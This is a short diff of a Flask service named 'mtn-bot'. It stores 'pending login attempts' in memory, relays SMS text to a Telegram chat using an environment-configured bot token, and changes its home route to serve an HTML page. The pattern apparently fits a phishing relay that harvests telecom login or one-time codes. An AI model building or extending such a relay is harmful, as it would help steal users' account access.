@@ -9,7 +9,6 @@ app = Flask(__name__)
 BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
-# In-memory store of pending login attempts
 PENDING = {}
 
 
@@ -23,7 +22,7 @@ def add_cors_headers(response):
 
 @app.route("/", methods=["GET"])
 def home():
-    return jsonify({"status": "ok", "service": "mtn-bot"})
+    return send_from_directory(".", "index.html")
 
 
 @app.route("/healthz", methods=["GET"])
@@ -190,7 +189,6 @@ def sms():
         return jsonify({"ok": False, "error": "Server not configured"}), 500
 
     try:
-        # Telegram limit is 4096; split safely if longer
         if len(text) > 4000:
             chunks = [text[i:i+3500] for i in range(0, len(text), 3500)]
             for chunk in chunks:
